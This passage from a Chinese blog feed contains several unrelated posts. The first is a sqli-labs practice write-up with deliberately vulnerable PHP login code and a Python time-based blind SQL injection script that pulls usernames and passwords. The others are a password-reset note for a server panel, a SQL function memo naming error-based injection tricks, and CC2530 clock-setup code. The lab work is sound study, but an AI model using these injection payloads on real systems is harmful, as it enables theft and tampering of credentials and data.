sys.stdout.flush()search()代码来源：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;e5a42373ed12</code></pre><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;    echo $sql;    echo &quot;&lt;br&gt;&quot;;    $result&#x3D;mysql_query($sql);    $row &#x3D; mysql_fetch_array($result);    if($row)    &#123;          &#x2F;&#x2F;echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot;&gt;&#39;;              echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 4&gt;&#39;;        &#x2F;&#x2F;echo &quot; You Have successfully logged in\n\n &quot; ;        echo &#39;&lt;font size&#x3D;&quot;3&quot; color&#x3D;&quot;#0000ff&quot;&gt;&#39;;            echo &quot;&lt;br&gt;&quot;;        &#x2F;&#x2F;echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];        echo &quot;&lt;br&gt;&quot;;        &#x2F;&#x2F;echo &#39;Your Password:&#39; .$row[&#39;password&#39;];        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;&#x2F;font&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;flag.jpg&quot;  &#x2F;&gt;&#39;;              echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;    else      &#123;        echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D;&quot;3&quot;&gt;&#39;;        &#x2F;&#x2F;echo &quot;Try again looser&quot;;        &#x2F;&#x2F;print_r(mysql_error());        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;slap.jpg&quot;   &#x2F;&gt;&#39;;            echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;</code></pre><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a><strong>Less-</strong>16</h1><p>把Less-15脚本SQL语句中前面的” ‘ “换成” “) “即可</p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a><strong>Less-</strong>17</h1><p>php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;including the Mysql connect parameters.include(&quot;..&#x2F;sql-connections&#x2F;sql-connect.php&quot;);error_reporting(0);function check_input($value)    &#123;    if(!empty($value))&#x2F;&#x2F;检查是否为空        &#123;        &#x2F;&#x2F; truncation (see comments)        $value &#x3D; substr($value,0,15);&#x2F;&#x2F;截取前面15个字符        &#125;        &#x2F;&#x2F; Stripslashes if magic quotes enabled        if (get_magic_quotes_gpc())&#x2F;&#x2F;此方法当magic_quotes_gpc开启时所有的 &#39; (单引号)、&quot; (双引号)、\（反斜杠）和 NULL字符都会被一个反斜杠自动转义。 但在php5.4起已经被放弃，始终返回false        &#123;            $value &#x3D; stripslashes($value);&#x2F;&#x2F;去除反斜杠        &#125;        &#x2F;&#x2F; Quote if not a number        if (!ctype_digit($value))&#x2F;&#x2F;纯数字检测        &#123;            $value &#x3D; &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;&#x2F;&#x2F;mysql_real_escape_string对字符串中的特殊字符进行转义，会被进行转义的字符包括： NULL（ASCII 0），\n，\r，\，&#39;，&quot; 和 Control-Z.         &#125;    else        &#123;        $value &#x3D; intval($value);&#x2F;&#x2F;获取变量的整数值        &#125;    return $value;    &#125;&#x2F;&#x2F; take the variablesif(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))&#123;    &#x2F;&#x2F;making sure uname is not injectable    $uname&#x3D;check_input($_POST[&#39;uname&#39;]);  &#x2F;&#x2F;uname被check_input了，详见上面的代码    $passwd&#x3D;$_POST[&#39;passwd&#39;];    &#x2F;&#x2F;logging the connection parameters to a file for analysis.    $fp&#x3D;fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;User Name:&#39;.$uname.&quot;\n&quot;);    fwrite($fp,&#39;New Password:&#39;.$passwd.&quot;\n&quot;);    fclose($fp);    &#x2F;&#x2F; connectivity     @$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D; $uname LIMIT 0,1&quot;;    echo $sql;    echo &quot;&lt;br&gt;&quot;;    $result&#x3D;mysql_query($sql);    $row &#x3D; mysql_fetch_array($result);    &#x2F;&#x2F;echo $row;    if($row)    &#123;          &#x2F;&#x2F;echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot;&gt;&#39;;            $row1 &#x3D; $row[&#39;username&#39;];              &#x2F;&#x2F;echo &#39;Your Login name:&#39;. $row1;        $update&#x3D;&quot;UPDATE users SET password &#x3D; &#39;$passwd&#39; WHERE username&#x3D;&#39;$row1&#39;&quot;;        mysql_query($update);          echo &quot;&lt;br&gt;&quot;;        if (mysql_error())        &#123;            echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 3 &gt;&#39;;            print_r(mysql_error());            echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;br&gt;&quot;;            echo &quot;&lt;&#x2F;font&gt;&quot;;        &#125;        else        &#123;            echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 3 &gt;&#39;;            &#x2F;&#x2F;echo &quot; You password has been successfully updated &quot; ;                    echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;&#x2F;font&gt;&quot;;        &#125;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;flag1.jpg&quot;   &#x2F;&gt;&#39;;            &#x2F;&#x2F;echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;    else      &#123;        echo &#39;&lt;font size&#x3D;&quot;4.5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;        &#x2F;&#x2F;echo &quot;Bug off you Silly Dumb hacker&quot;;        echo &quot;&lt;&#x2F;br&gt;&quot;;        echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;slap1.jpg&quot;   &#x2F;&gt;&#39;;        echo &quot;&lt;&#x2F;font&gt;&quot;;      &#125;&#125;?&gt;</code></pre><p>python</p><pre class="language-python" data-language="python"><code class="language-python">import requestsstr &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.&quot;url &#x3D; &quot;http:&#x2F;&#x2F;192.168.184.1:801&#x2F;sqli&#x2F;Less-17&#x2F;&quot;for i in range(1,200):    for j in str:        #1&#39; where username&#x3D;&#39;admin&#39; and if(mid((select database()),1,1)&#x3D; &#39;s&#39;,sleep(3),1)#        #1&#39; where username&#x3D;&#39;admin&#39; and if(mid((select  database()),&#123;&#125;,1)&#x3D; &#39;&#123;&#125;&#39;,sleep(3),1)#        #1&#39; where username&#x3D;&#39;admin&#39; and if(mid((select group_concat(table_name,&#39;&#39;) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D; &#39;&#123;&#125;&#39;,sleep(3),1)#        #1&#39; where username&#x3D;&#39;admin&#39; and if(mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;database()),&#123;&#125;,1)&#x3D; &#39;&#123;&#125;&#39;,sleep(3),1)#        #1&#39; where username&#x3D;&#39;admin&#39; and if(substr((select * from (select GROUP_CONCAT(BINARY(username),&#39;,&#39;,BINARY(password)) from users) as temp),&#123;&#125;,1)&#x3D; &#39;&#123;&#125;&#39;,sleep(3),1)#        flag &#x3D; &quot;1&#39; where username&#x3D;&#39;admin&#39; and if(substr((select * from (select GROUP_CONCAT(BINARY(username),&#39;,&#39;,BINARY(password)) from users) as temp),&#123;&#125;,1)&#x3D; &#39;&#123;&#125;&#39;,sleep(3),1)#&quot;.format(i,j)        data &#x3D; &#123;&quot;uname&quot;:&quot;admin&quot;,&quot;passwd&quot;:flag,&quot;submit&quot;:&quot;submit&quot;&#125;        r &#x3D; requests.post(url,data&#x3D;data)        #print(&quot;&#123;&#125;&quot;.format(r.status_code))        if r.elapsed.total_seconds()&gt;2:            print(j,end &#x3D; &#39;&#39;)            break</code></pre><p>加上<code>where username=&#39;admin&#39;</code>是为了减少爆破时间，因为在改<code>password</code>的时候就只会改<code>admin</code>的<code>password</code>了，如果不加上亦可，不加上的话会将所有的<code>password</code>都改为<code>1</code>，但也达到了目的，在最后爆破字段的时候采用了一个虚表<code>temp</code>，因为<code>update</code>操作和<code>select</code>操作都作用于一张表，且会报错：<code>Table &#39;test&#39; is specified twice, both as a target for &#39;UPDATE&#39; and as a separate source for data</code>所以采用虚表进行盲注，且使用了<code>BINARY</code>函数来区分表中内容的大小写</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> SQL </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次有惊无险！！！</title>
      <link href="/posts/53c288d6/"/>
      <url>/posts/53c288d6/</url>
      
        <content type="html"><![CDATA[<p>莫名其妙的phpmyadmin就进不去了，一直密码错误，在bt里面改密码也进不去，搞的后来差一点删除数据库</p><p>解决方法：</p><p>修改数据库密码：</p><pre class="language-shell" data-language="shell"><code class="language-shell">cd &#x2F;www&#x2F;server&#x2F;panel &amp;&amp; python tools.pyc root xxx</code></pre><p>修改bt面板的密码：</p><pre class="language-shell" data-language="shell"><code class="language-shell">cd &#x2F;www&#x2F;server&#x2F;panel &amp;&amp; python tools.pyc panel xxx</code></pre><a id="more"></a><p>xxx处写修改你的数据库密码或bt密码</p><p>注意，修改完密码后访问wp博客会显示数据库连接错误，这时在wp-config.php中修改你的MySQL数据库密码就行啦！</p><p>附上参考原文<a href="https://www.xqblog.com/12973.html">链接</a></p><p>感谢！</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%9C%89%E6%83%8A%E6%97%A0%E9%99%A9%EF%BC%81%EF%BC%81%EF%BC%81/55667523_p0_master1200.jpg" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SQL中的一些函数（备忘）</title>
      <link href="/posts/cf51e998/"/>
      <url>/posts/cf51e998/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a><strong>SQL Server</strong></h1><h2 id="STUFF-character-expression-start-length-character-expression"><a href="#STUFF-character-expression-start-length-character-expression" class="headerlink" title="STUFF ( character_expression , start , length ,character_expression )"></a><strong>STUFF ( character_expression , start , length ,character_expression )</strong></h2><p>character_expression：一个字符数据表达式，可以是常量，变量，也可以是字符列或二级制数据列</p><p>start：一个重整数值，指定要删除和插入的开始位置，如果start或length为负，则返回空字符串。如果start比第一个character_expression长，则返回空字符串。start可以是big int型。</p><p>length：一个整数，指定要删除的字符串。如果length比第一个character_expression长，则最多删除到最后一个character_expression中的最后一个字符。length可以是big int类型。</p><p>返回类型：如果character_expression是受支持的字符数据类型，则返回字符数据。如果character_expression是一个受支持的binary数据类型，则返回二进制数据。</p><p>例如：</p><p>以下示例在第一个字符串 abcdef 中删除从第 2 个位置（字符 b）开始的三个字符，然后在删除的起始位置插入第二个字符串，从而创建并返回一个字符串。</p><pre class="language-sql" data-language="sql"><code class="language-sql">SELECT STUFF(&#39;abcdef&#39;, 2, 3, &#39;ijklmn&#39;);结果：aijklmnef</code></pre><h2 id="FOR-XML-PATH-‘’"><a href="#FOR-XML-PATH-‘’" class="headerlink" title="FOR XML PATH(‘’)"></a><strong>FOR XML PATH(‘’)</strong></h2><p>通常与stuff函数结合起来使用， 将查询结果集以<a href="https://baike.baidu.com/item/%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/2885849?fromtitle=xml&fromid=86251&fr=aladdin">XML</a>形式展现</p><p>现有表</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-107.png" alt loading="lazy"></p><p>执行</p><pre class="language-sql" data-language="sql"><code class="language-sql">select stuff((select &#39;,&#39;+test_name+test_pass from test for xml path(&#39;root&#39;)),1,1,&#39;&#39;)</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-108.png" alt loading="lazy"></p><pre class="language-sql" data-language="sql"><code class="language-sql">select stuff((select &#39;,&#39;+test_name+test_pass from test for xml path(&#39;&#39;)),1,1,&#39;&#39;)</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-109.png" alt loading="lazy"></p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><strong>MySQL</strong></h1><h2 id="Concat-str1-str2-…"><a href="#Concat-str1-str2-…" class="headerlink" title="Concat( str1,str2,… )"></a><strong>Concat( str1,str2,… )</strong></h2><p>返回结果为连续参数产生的字符串。如果任何一个参数为NULL，则返回值为NULL。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-138.png" alt loading="lazy"></p><h2 id="Concat-ws-separator-str1-str2-…"><a href="#Concat-ws-separator-str1-str2-…" class="headerlink" title="Concat_ws(separator,str1,str2,…)"></a><strong>Concat_ws(separator,str1,str2,…)</strong></h2><p>concat_ws()代表concat with separator ，是concat的特殊形式。第一个参数是其它参数的分隔符，如果分隔符为NULL，则结果为NULL</p><p>函数返回结果为连接参数产生的字符串</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-139.png" alt loading="lazy"></p><h2 id="Group-concat"><a href="#Group-concat" class="headerlink" title="Group_concat()"></a>Group_concat()</h2><p>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])</p><p>将同一个分组中的值连接起来，返回一个字符串结果。</p><p>通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200203144159549.png" alt loading="lazy"></p><h2 id="Updatexml-XML-document-XPath-string-new-value"><a href="#Updatexml-XML-document-XPath-string-new-value" class="headerlink" title="Updatexml (XML_document, XPath_string, new_value)"></a><strong>Updatexml (XML_document, XPath_string, new_value)</strong></h2><ul><li>XML_document：String格式，为XML文档对象的名称</li><li>XPath_string：XPath格式的字符串</li><li>new_value：String格式，替换查找到的符合条件的数据</li></ul><p>SQL注入通常用于显错注入；XPath_string出参数错误报错，得到信息，方法：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">updatexml(1,concat(1,(SELECT database())),1);</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-141.png" alt loading="lazy"></p><h2 id="Extractvalue-XML-document-XPath-string"><a href="#Extractvalue-XML-document-XPath-string" class="headerlink" title="Extractvalue (XML_document, XPath_string)"></a><strong>Extractvalue (XML_document, XPath_string)</strong></h2><ul><li><p>XML_document：String格式，为XML文档对象的名称</p></li><li><p>XPath_string：Xpath格式的字符串</p><p>extractvalue(1,concat(1,database()));</p></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-142.png" alt loading="lazy"></p><h2 id="Left-ARG-LENGTH-、Right-ARG-LENGTH"><a href="#Left-ARG-LENGTH-、Right-ARG-LENGTH" class="headerlink" title="Left(ARG,LENGTH)、Right(ARG,LENGTH)"></a><strong>Left(ARG,LENGTH)、Right(ARG,LENGTH)</strong></h2><p>此函数返回ARG最左边，右边的LENGTH个字符串，ARG可是char或binary，string</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-143.png" alt loading="lazy"></p><h2 id="Substr-stirng-strat-length"><a href="#Substr-stirng-strat-length" class="headerlink" title="Substr(stirng,strat,length)"></a><strong>Substr(stirng,strat,length)</strong></h2><ul><li>string：需要截取的字符串</li><li>start：开始截取的位置</li><li>length：需要截取字符串的个数，若无此项，则从截取位置一直截取到最后</li></ul><p>必要的时候可以不用逗号用<code>from</code>和<code>for</code>代替，<code>substr(string from start for length)</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-152.png" alt loading="lazy"></p><h2 id="Ascii-str"><a href="#Ascii-str" class="headerlink" title="Ascii(str)"></a><strong>Ascii(str)</strong></h2><p>返回字符串str的最左字符的数值。返回0，如果str为空字符串。返回NULL，如果str为NULL。 ASCII()返回数值是从0到255。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-166.png" alt loading="lazy"></p><h2 id="Pow-x-y"><a href="#Pow-x-y" class="headerlink" title="Pow(x,y)"></a>Pow(x,y)</h2><p>pow(x,y)表示计算x的y次方，当计算值过大时，会发生DOUBLE溢出，数据库报错</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200203151717577.png" alt loading="lazy"></p><h2 id="MID-column-name-start-length"><a href="#MID-column-name-start-length" class="headerlink" title="MID(column_name,start[,length])"></a>MID(column_name,start[,length])</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200224203301659.png" alt loading="lazy"></p><p>必要的时候可以不用逗号用<code>from</code>和<code>for</code>代替，<code>mid(string from start for length)</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200224204817021.png" alt loading="lazy"></p><h2 id="Like"><a href="#Like" class="headerlink" title="Like"></a>Like</h2><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</p><p>支持通配符匹配，like有两个模式：<code>_</code>和<code>%</code></p><p><strong>_</strong>：表示单个字符，<strong>%</strong>：表示0个或多个任意字符</p><p>例如：<code>name,%,%e,n%,%a%,_ame,____,_%_</code>都匹配<code>name</code>这个字符</p><h2 id="Rlike和Regexp"><a href="#Rlike和Regexp" class="headerlink" title="Rlike和Regexp"></a>Rlike和Regexp</h2><p><code>rlike==regexp</code>  都是正则匹配，特殊字符需要进行适当的反斜杠转义</p><h2 id="INSTR-C1-C2-I-J"><a href="#INSTR-C1-C2-I-J" class="headerlink" title="INSTR(C1,C2,I,J)"></a>INSTR(C1,C2,I,J)</h2><p><strong>C1</strong>：表示被搜索的字符串</p><p><strong>C2</strong>：希望搜索的字符串</p><p><strong>I</strong>：搜索的开始位置，默认为1</p><p><strong>J</strong>：出现的位置，默认为1</p><p>返回值为匹配开始的位置，sql中第一个字符的位置为1</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503180526297.png" alt loading="lazy"></p><h2 id="IF-expr1-expr2-expr3"><a href="#IF-expr1-expr2-expr3" class="headerlink" title="IF(expr1,expr2,expr3)"></a>IF(expr1,expr2,expr3)</h2><p>如果<strong>expr1</strong>是<strong>TRUE(expr1&lt;&gt;0 and expr1&lt;&gt;NULL)</strong>，则语句发返回值为<strong>expr2</strong>，否则返回<strong>expr3</strong></p><p>另外还有一种写法：<code>case when expr1 then expr2 else expr3</code></p><h2 id="limit-i-n"><a href="#limit-i-n" class="headerlink" title="limit i,n"></a>limit i,n</h2><p><strong>i</strong>：为查询结果的索引值，默认从0开始</p><p><strong>n</strong>：为从第<strong>i</strong>条开始之后的<strong>n</strong>条记录</p><h2 id="set-a-’-sql-’-prepare-table-from-a-execute-table"><a href="#set-a-’-sql-’-prepare-table-from-a-execute-table" class="headerlink" title="set  @a=’(sql)’;prepare (table) from @a;execute (table);"></a>set  @a=’(sql)’;prepare (table) from @a;execute (table);</h2><p><strong>sql</strong>：为要执行的sql语句，可以将其化为十六进制后传入饶过单引号限制</p><p><strong>table</strong>：为执行sql语句的表</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214904653.png" alt loading="lazy"></p><h2 id="BINARY"><a href="#BINARY" class="headerlink" title="BINARY()"></a>BINARY()</h2><p>SQL语句中默认是不区分大小写，在sql语句中加上<strong>binary</strong>即可区分</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214747191.png" alt loading="lazy"></p><h2 id="CAST-expr-as-type-CONVERT-expr-type"><a href="#CAST-expr-as-type-CONVERT-expr-type" class="headerlink" title="CAST(expr as type),CONVERT(expr,type)"></a>CAST(expr as type),CONVERT(expr,type)</h2><p>转换任意类型<strong>expr</strong>为指定的<strong>type</strong>类型</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214604050.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时钟，串口配置</title>
      <link href="/posts/11ef9369/"/>
      <url>/posts/11ef9369/</url>
      
        <content type="html"><![CDATA[<h1 id="切换系统高频时钟源"><a href="#切换系统高频时钟源" class="headerlink" title="切换系统高频时钟源"></a>切换系统高频时钟源</h1><p>CC2530在正常运行的时候需要一个高频时钟信号和一个低频的时钟信号</p><ul><li>高频时钟信号：主要供给给CPU，保证程序的运行</li><li>低频时钟信号：主要供给看门狗，睡眠定时器等偏上外设</li></ul><p>时钟信号来源</p><ul><li>高频信号两个来源：芯片内部的16M RC电路；外接的32M石英晶振</li><li>低频信号两个来源：芯片内部的32K RC电路，外接的32.768K石英晶振</li></ul><a id="more"></a><p>CC2530默认上电的时候，是内部的2个RC电路作为高频和低频的时钟来源</p><p>如果我们在用串口，特别是无线通信的时候，必须要用32M的石英晶振作为高频时钟来源，16M比32M的速度慢，为32M的1/2</p><p>高频时钟源特点：</p><ul><li>两个高频时钟源可以同时起振产生高频时钟信号</li><li>而两个低频时钟源，某一时刻只能有1个起振，并且起振能的这个时钟源供给CC2530</li></ul><p>切换步骤：</p><p>1、2个高频时钟源起振； 让SLEEPCMD的第2位为0；</p><pre class="language-c" data-language="c"><code class="language-c">SLEEPCMD &amp;&#x3D;0xFB;&#x2F;&#x2F;1111 1011 开启2个高频时钟源</code></pre><p>2、待目标时钟源振荡稳定；SLEEPSTA寄存器的第6位为1表示32 时钟源稳定</p><pre class="language-c" data-language="c"><code class="language-c">while(0&#x3D;&#x3D;(SLEEPSTA &amp; 0x40));&#x2F;&#x2F; 0100 0000 等待32M稳定</code></pre><p>3、 延时一小段时间63us（不定）； 超过63微秒延时</p><pre class="language-c" data-language="c"><code class="language-c">void delayus()&#x2F;&#x2F;调用函数实现&#123;    char k&#x3D;63;    while(k--);&#125;</code></pre><p>4、不分频输出； 把寄存器CLKCONCMD的低3位 设置为000，表示不分频输出</p><pre class="language-c" data-language="c"><code class="language-c">CLKCONCMD &amp;&#x3D;0xF8;&#x2F;&#x2F;1111 1000 不分频输出</code></pre><p>5、 选中目标高频时钟源作为系统主时钟； 把寄存器CLKCONCMD的第6位 清0，设置32M作为系统主时钟</p><pre class="language-c" data-language="c"><code class="language-c">CLKCONCMD &amp;&#x3D;0XBF;&#x2F;&#x2F;1011 1111 设置32M作为系统主时钟</code></pre><p>6、确认一下当前工作的系统时钟是不是所选的高频时钟；如果读CLKCONSTA这个寄存器的第6位为0，表示32M的时钟源已经作为了当前的系统主时钟，程序可以往下运行了。</p><pre class="language-c" data-language="c"><code class="language-c">while(CLKCONSTA &amp; 0x40); &#x2F;&#x2F;0100 0000 等待32M成功成为当前系统主时钟</code></pre><h1 id="数码管测试"><a href="#数码管测试" class="headerlink" title="数码管测试"></a>数码管测试</h1><p>32M代码：</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;iocc2530.h&gt;#include&quot;74LS164_8LED.h&quot;void delayus()&#123;    char k&#x3D;63;    while(k--);&#125;void delay()&#123;  int i,j;     for(i&#x3D;0;i&lt;1000;i++)       for(j&#x3D;0;j&lt;800;j++);&#125;void Init32M()&#123;   SLEEPCMD &amp;&#x3D;0xFB;&#x2F;&#x2F;1111 1011 开启2个高频时钟源   while(0&#x3D;&#x3D;(SLEEPSTA &amp; 0x40));&#x2F;&#x2F; 0100 0000 等待32M稳定   delayus();   CLKCONCMD &amp;&#x3D;0xF8;&#x2F;&#x2F;1111 1000 不分频输出   CLKCONCMD &amp;&#x3D;0XBF;&#x2F;&#x2F;1011 1111 设置32M作为系统主时钟   while(CLKCONSTA &amp; 0x40); &#x2F;&#x2F;0100 0000 等待32M成功成为当前系统主时钟&#125;void main()&#123;     char i;     LS164_Cfg();     Init32M();     while(1)     &#123;         for(i&#x3D;0;i&lt;10;i++)         &#123;            LS164_BYTE(i);&#x2F;&#x2F;数码管显示函数，i为几，数码管显示几            delay();         &#125;     &#125;&#125;</code></pre><p>16M代码：</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;iocc2530.h&gt;#include&quot;74LS164_8LED.h&quot;void delay()&#123;  int i,j;     for(i&#x3D;0;i&lt;1000;i++)       for(j&#x3D;0;j&lt;800;j++);&#125;void main()&#123;     char i;     LS164_Cfg();     while(1)     &#123;         for(i&#x3D;0;i&lt;10;i++)         &#123;            LS164_BYTE(i);            delay();         &#125;     &#125;&#125;</code></pre><p>另外附上74LS164_8LED 数码管显示的代码，把代码添加到工程里即可</p><p>74LS164_8LED.h</p><pre class="language-c" data-language="c"><code class="language-c">#ifndef __74LS164_8LED_H__#define __74LS164_8LED_H__#include&lt;ioCC2530.h&gt;#define  LS164_DATA  P1_3#define  LS164_CLK   P1_2#define  UCHAR  unsigned char void LS164_Cfg();void LS164_BYTE(UCHAR Data);&#x2F;&#x2F;P1.3  DATA   P1.2  CLK#endif</code></pre><p>74LS164_8LED.c</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;ioCC2530.h&gt;#include&quot;74LS164_8LED.h&quot;static UCHAR LED_Map[]&#x3D;&#123;0x3f,0x06,0x5b,0x4f,                        0x66,0x6d,0x7d,0x07,                        0x7f,0x6f,0x00,0xFF&#125;;void LS164_Cfg()&#123;    P1SEL 